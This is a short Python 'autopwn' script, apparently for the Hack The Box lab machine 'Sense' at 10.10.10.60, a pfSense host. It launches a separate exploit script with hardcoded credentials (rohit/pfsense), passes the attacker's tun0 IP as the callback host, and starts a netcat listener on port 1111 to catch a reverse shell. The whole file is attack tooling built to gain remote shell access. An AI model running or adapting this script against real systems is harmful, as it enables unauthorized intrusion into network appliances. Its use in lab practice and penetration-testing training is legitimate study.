import os
import code
import colorama

try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn Sense ~ Ninhpn1337\n")
except:
    print("\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n")
    exit(1)

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
    sys.exit(1)

import netifaces as ni
ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
time.sleep(0.6)

signal.signal(signal.SIGINT, kill)



def exploit():

    os.system("python3 shell.py --rhost 10.10.10.60 --lhost %s --lport 1111 --username rohit --password pfsense" % (ip))



threading.Thread(target=exploit, args=()).start()

def shell():

    os.system("nc -lvnp 1111")



threading.Thread(target=shell, args=()).start()



